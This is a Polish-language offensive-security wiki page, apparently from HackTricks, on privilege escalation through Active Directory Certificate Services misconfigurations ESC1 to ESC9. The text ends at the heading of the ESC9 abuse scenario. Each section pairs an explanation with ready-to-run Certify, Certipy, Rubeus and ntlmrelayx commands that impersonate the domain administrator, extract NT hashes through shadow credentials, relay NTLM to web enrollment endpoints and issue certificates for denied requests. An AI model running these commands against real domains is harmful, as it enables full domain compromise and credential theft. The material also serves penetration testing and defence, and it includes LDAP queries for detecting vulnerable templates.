# AD CS Eskalacja w domenie

{{#include ../../../banners/hacktricks-training.md}}


**To jest podsumowanie sekcji technik eskalacji z poniższych wpisów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Wyjaśnienie

### Misconfigured Certificate Templates - ESC1 Wyjaśnienie

- **Prawa do rejestracji (enrolment rights) są przyznawane niskoprzywilejowanym użytkownikom przez Enterprise CA.**
- **Zatwierdzenie przez menedżera nie jest wymagane.**
- **Nie są potrzebne podpisy uprawnionego personelu.**
- **Security descriptors na szablonach certyfikatów są zbyt liberalne, pozwalając niskoprzywilejowanym użytkownikom uzyskać prawa do rejestracji.**
- **Szablony certyfikatów są skonfigurowane tak, aby określać EKU ułatwiające uwierzytelnianie:**
- Extended Key Usage (EKU) identyfikatory takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), lub brak EKU (SubCA) są uwzględnione.
- **Szablon pozwala wnioskodawcom na określenie subjectAltName w Certificate Signing Request (CSR):**
- Active Directory (AD) priorytetyzuje subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR można zażądać certyfikatu, który podszyje się pod dowolnego użytkownika (np. administratora domeny). Możliwość określenia SAN przez wnioskodawcę jest wskazywana w obiekcie szablonu certyfikatu w AD przez właściwość `mspki-certificate-name-flag`. Właściwość ta jest bitmaską, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zezwala wnioskodawcy na określenie SAN.

> [!CAUTION]
> Konfiguracja opisana powyżej pozwala niskoprzywilejowanym użytkownikom żądać certyfikatów z dowolnym SAN, co umożliwia uwierzytelnianie się jako dowolny podmiot domeny poprzez Kerberos lub SChannel.

Funkcja ta jest czasem włączana, by wspierać generowanie na żądanie certyfikatów HTTPS lub hosta przez produkty czy usługi wdrożeniowe, albo wskutek braku zrozumienia.

Zauważono, że tworzenie certyfikatu z tą opcją generuje ostrzeżenie, czego nie widać w sytuacji, gdy istniejący szablon certyfikatu (np. `WebServer`, który ma włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) zostanie skopiowany i następnie zmodyfikowany, aby dodać OID uwierzytelniania.

### Abuse

Aby **znaleźć podatne szablony certyfikatów** możesz uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę podatność do podszycia się pod administratora** można uruchomić:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekonwertować wygenerowany **certyfikat do formatu `.pfx`** i ponownie użyć go do **uwierzytelnienia za pomocą Rubeus lub certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binarne pliki Windows "Certreq.exe" i "Certutil.exe" mogą być użyte do wygenerowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Wyliczenie szablonów certyfikatów w schemacie konfiguracji lasu AD, konkretnie tych, które nie wymagają zatwierdzeń ani podpisów, posiadają EKU Client Authentication lub Smart Card Logon oraz mają włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić uruchamiając następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Błędnie skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

1. Enterprise CA przyznaje prawa rejestracji certyfikatów użytkownikom o niskich uprawnieniach.
2. Wymóg zatwierdzenia przez managera jest wyłączony.
3. Wymóg autoryzowanych podpisów jest pominięty.
4. Nadmiernie liberalny security descriptor w szablonie certyfikatu przyznaje prawa rejestracji certyfikatu użytkownikom o niskich uprawnieniach.
5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierać Any Purpose EKU lub nie zawierać EKU.**

**Any Purpose EKU** pozwala atakującemu uzyskać certyfikat do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itd. Tę samą **technikę używaną dla ESC3** można zastosować do wykorzystania tego scenariusza.

Certyfikaty z **brakiem EKU**, które działają jako certyfikaty subordinowanego CA, mogą być wykorzystane do **dowolnego celu** i **mogą również służyć do podpisywania nowych certyfikatów**. W związku z tym atakujący mógłby określić dowolne EKU lub pola w nowych certyfikatach, wykorzystując certyfikat subordinowanego CA.

Jednak nowe certyfikaty utworzone do **uwierzytelniania domenowego** nie będą działać, jeśli certyfikat subordinowanego CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Niemniej jednak atakujący wciąż może utworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Mogą one potencjalnie zostać **nadużyte** do szerokiego zakresu celów (np. podpisywanie kodu, uwierzytelnianie serwera itp.) i mogą mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Błędnie skonfigurowane szablony Enrollment Agent - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale nadużywa innego EKU (Certificate Request Agent) oraz 2 różnych szablonów (w związku z tym ma 2 zestawy wymagań).

The Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1), znany jako Enrollment Agent w dokumentacji Microsoft, umożliwia principalowi enroll for a certificate on behalf of another user.

„enrollment agent” zapisuje się w takim „template” i używa wynikowego certificate do współpodpisania CSR w imieniu innego użytkownika. Następnie wysyła współpodpisany CSR do CA, zapisując się w template, który zezwala na „enroll on behalf of”, a CA wystawia certificate należący do „innego” użytkownika.

**Wymagania 1:**

- Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do enrollment.
- Wymóg zatwierdzenia przez managera jest pominięty.
- Brak wymogu autoryzowanych podpisów.
- Security descriptor certificate template jest nadmiernie permisywny i przyznaje enrollment rights użytkownikom o niskich uprawnieniach.
- Certificate template zawiera Certificate Request Agent EKU, umożliwiając request of other certificate templates on behalf of other principals.

**Wymagania 2:**

- Enterprise CA przyznaje enrollment rights użytkownikom o niskich uprawnieniach.
- Manager approval jest pomijane.
- Wersja schematu template jest albo 1, albo większa niż 2, i określa Application Policy Issuance Requirement, które wymaga Certificate Request Agent EKU.
- EKU zdefiniowane w certificate template pozwala na domain authentication.
- Ograniczenia dla enrollment agents nie są stosowane na CA.

### Nadużycie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy) aby nadużyć tego scenariusza:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Użytkownicy, którym zezwolono na uzyskanie **enrollment agent certificate**, szablony, do których agenci rejestracji mogą się zapisać, oraz **accounts**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez enterprise CAs. Osiąga się to przez otwarcie `certsrc.msc` **snap-in**, **kliknięcie prawym przyciskiem myszy na CA**, **wybranie Properties**, a następnie **przejście** na kartę “Enrollment Agents”.

Jednakże zauważono, że ustawienie **domyślne** dla CA to “**Do not restrict enrollment agents**.” Gdy administratorzy włączą ograniczenie dotyczące agentów rejestracji, ustawiając je na “Restrict enrollment agents,” domyślna konfiguracja nadal pozostaje skrajnie liberalna. Pozwala ona **Everyone** na rejestrację we wszystkich szablonach jako dowolny użytkownik.

## Wrażliwa kontrola dostępu do szablonów certyfikatów - ESC4

### **Wyjaśnienie**

**deskryptor bezpieczeństwa** na **szablonach certyfikatów** definiuje **uprawnienia**, które konkretne **podmioty AD** posiadają względem szablonu.

Jeśli **atakujący** posiada wymagane **uprawnienia** do **modyfikacji** **szablonu** i wprowadzenia dowolnych **eksploatowalnych błędów konfiguracji** opisanych we **wcześniejszych sekcjach**, może to ułatwić eskalację uprawnień.

Znaczące uprawnienia mające zastosowanie do szablonów certyfikatów to:

- **Owner:** Przyznaje domyślną kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełną władzę nad obiektem, włącznie z możliwością zmiany dowolnych atrybutów.
- **WriteOwner:** Pozwala zmienić właściciela obiektu na podmiot kontrolowany przez atakującego.
- **WriteDacl:** Umożliwia modyfikację list kontroli dostępu, co może przyznać atakującemu FullControl.
- **WriteProperty:** Upoważnia do edycji dowolnych właściwości obiektu.

### Nadużycie

Aby zidentyfikować podmioty mające prawa do edycji szablonów i innych obiektów PKI, wyenumeruj za pomocą Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Przykład privesc podobny do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia zapisu do szablonu certyfikatu. Można to np. wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby uczynić go podatnym na ESC1.

Jak widać na ścieżce powyżej, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nową krawędź `AddKeyCredentialLink` do `JOHNPC`.

Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem też ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).

Oto krótki przedsmak polecenia Certipy’s `shadow auto`, służącego do pobrania NT hasha ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu jednym poleceniem. **Domyślnie**, Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy również określić **`-save-old` parametr, aby zapisać starą konfigurację**, co będzie przydatne do **przywrócenia** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Słaba kontrola dostępu do obiektów PKI - ESC5

### Wyjaśnienie

Rozległa sieć powiązań oparta na ACL, obejmująca kilka obiektów wykraczających poza certificate templates i certificate authority, może wpływać na bezpieczeństwo całego systemu AD CS. Obiekty te, które mogą znacząco wpłynąć na bezpieczeństwo, obejmują:

- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
- The RPC/DCOM server of the CA server.
- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach uzyska kontrolę nad którymkolwiek z tych krytycznych komponentów.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Wątek poruszony w [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) omawia także implikacje flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, zgodnie z opisem Microsoft. Ta konfiguracja, po aktywacji na Certification Authority (CA), pozwala na umieszczanie wartości zdefiniowanych przez użytkownika w subject alternative name dla dowolnego requestu, w tym tych zbudowanych z Active Directory®. W konsekwencji umożliwia to intruzowi enroll poprzez dowolny template skonfigurowany do uwierzytelniania domenowego — zwłaszcza te otwarte do rejestracji przez nieuprzywilejowanych użytkowników, jak standardowy User template. W rezultacie atakujący może uzyskać certyfikat pozwalający na uwierzytelnienie jako administrator domeny lub dowolny inny aktywny obiekt w domenie.

**Uwaga**: Metoda dopisywania alternative names do Certificate Signing Request (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (nazywanego „Name Value Pairs”) kontrastuje z techniką wykorzystywania SANs w ESC1. Różnica polega na tym, jak informacje o koncie są kapsułowane — w atrybucie certyfikatu, zamiast w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy ustawienie jest aktywne, organizacje mogą wykorzystać następujące polecenie z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **remote registry access**, więc alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) są w stanie wykryć tę nieprawidłową konfigurację i ją wykorzystać:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, jeśli posiada się **domain administrative** prawa lub równoważne, można wykonać następujące polecenie z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Po aktualizacjach zabezpieczeń z maja 2022, nowo wydane **certyfikaty** będą zawierać **rozszerzenie zabezpieczeń**, które włącza **właściwość `objectSid` żądającego**. Dla ESC1 ten SID jest wyprowadzany z określonego SAN. Jednak dla **ESC6** SID odzwierciedla **`objectSid` żądającego**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (Weak Certificate Mappings), które faworyzuje **SAN nad nowym rozszerzeniem zabezpieczeń**.

## Narażona kontrola dostępu do CA - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do Certificate Authority jest utrzymywana przez zestaw uprawnień, które regulują działania CA. Te uprawnienia można zobaczyć, uruchamiając `certsrv.msc`, klikając prawym przyciskiem na CA, wybierając Properties, a następnie przechodząc do zakładki Security. Dodatkowo uprawnienia można wyliczyć używając modułu PSPKI za pomocą poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
To dostarcza wglądu w główne uprawnienia, mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „CA administrator” i „Certificate Manager”.

#### Nadużycie

Posiadanie uprawnień **`ManageCA`** na urzędzie certyfikacji (CA) umożliwia podmiotowi zdalną manipulację ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określenie SAN w dowolnym szablonie, co jest krytycznym elementem eskalacji domeny.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu PSPKI **Enable-PolicyModuleFlag**, co pozwala wprowadzać zmiany bez bezpośredniej interakcji z GUI.

Posiadanie uprawnień **`ManageCertificates`** umożliwia zatwierdzanie oczekujących żądań, skutecznie obchodząc zabezpieczenie "CA certificate manager approval".

Kombinacja modułów **Certify** i **PSPKI** może być użyta do złożenia żądania, zatwierdzenia i pobrania certyfikatu:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** uprawnienia **`Manage CA`** zostały użyte, aby **włączyć** flagę **EDITF_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia **ESC6 attack**, ale nie będzie to miało żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie zrestartowana. Gdy użytkownik ma prawo dostępu `Manage CA`, użytkownikowi przysługuje również możliwość **restartu usługi**. Jednakże to **nie oznacza, że użytkownik może zrestartować usługę zdalnie**. Co więcej, E**SC6 może nie działać od razu** w większości załatanych środowisk z powodu aktualizacji bezpieczeństwa z maja 2022.

W związku z tym przedstawiono tutaj inny atak.

Wymagania wstępne:

- Tylko **`ManageCA` permission**
- **`Manage Certificates`** permission (może być nadane z **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (może być włączony z **`ManageCA`**)

Technika opiera się na fakcie, że użytkownicy z prawami dostępu `Manage CA` _i_ `Manage Certificates` mogą wystawiać nieudane żądania certyfikatów. Szablon certyfikatu **`SubCA`** jest **vulnerable to ESC1**, ale **tylko administratorzy** mogą zapisać się do tego szablonu. Zatem **użytkownik** może **zażądać** zapisania się do **`SubCA`** — żądanie zostanie **odrzucone** — lecz następnie może zostać **wydane przez managera**.

#### Nadużycie

Możesz **grant yourself the `Manage Certificates`** access right, dodając swój użytkownik jako nowego officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne dla tego ataku, możemy zacząć od **zażądania certyfikatu na podstawie szablonu `SubCA`**.

**To żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zanotujemy ID żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Dzięki naszym **`Manage CA` i `Manage Certificates`** możemy następnie **wydać certyfikat dla nieudanej prośby** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I wreszcie możemy **pobrać wystawiony certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.

The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> W środowiskach, gdzie **AD CS is installed**, jeśli istnieje **vulnerable web enrollment endpoint** i przynajmniej jeden **certificate template is published**, który pozwala na **domain computer enrollment and client authentication** (na przykład domyślny **`Machine`** template), staje się możliwe, że **dowolny komputer z aktywną spooler service może zostać przejęty przez atakującego**!

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:


{{#ref}}
account-persistence.md
{{#endref}}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez korporacyjne Certificate Authorities (CAs) do przechowywania punktów końcowych Certificate Enrollment Service (CES). Te punkty końcowe można sparsować i wypisać za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycie za pomocą Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Wykorzystanie z [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie wykonywane przez Certipy na podstawie szablonu `Machine` lub `User`, w zależności od tego, czy nazwa konta będąca relayed kończy się na `$`. Wskazanie innego szablonu można zrealizować przy użyciu parametru `-template`.

Technikę taką jak [PetitPotam](https://github.com/ly4k/PetitPotam) można wtedy wykorzystać do wymuszenia uwierzytelnienia. W przypadku kontrolerów domeny wymagane jest użycie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia bezpieczeństwa - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, nazywana ESC9, uniemożliwia osadzenie **nowego rozszerzenia bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Flaga ta staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (ustawienie domyślne), w przeciwieństwie do ustawienia `2`. Jej znaczenie wzrasta w scenariuszach, w których można by wykorzystać słabsze mapowanie certyfikatu dla Kerberos lub Schannel (jak w ESC10), ponieważ brak ESC9 nie zmieniałby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

- `StrongCertificateBindingEnforcement` nie jest ustawione na `2` (domyślnie `1`), lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat jest oznaczony flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- Certyfikat określa dowolne EKU do uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, umożliwiające skompromitowanie innego.

### Scenariusz nadużycia

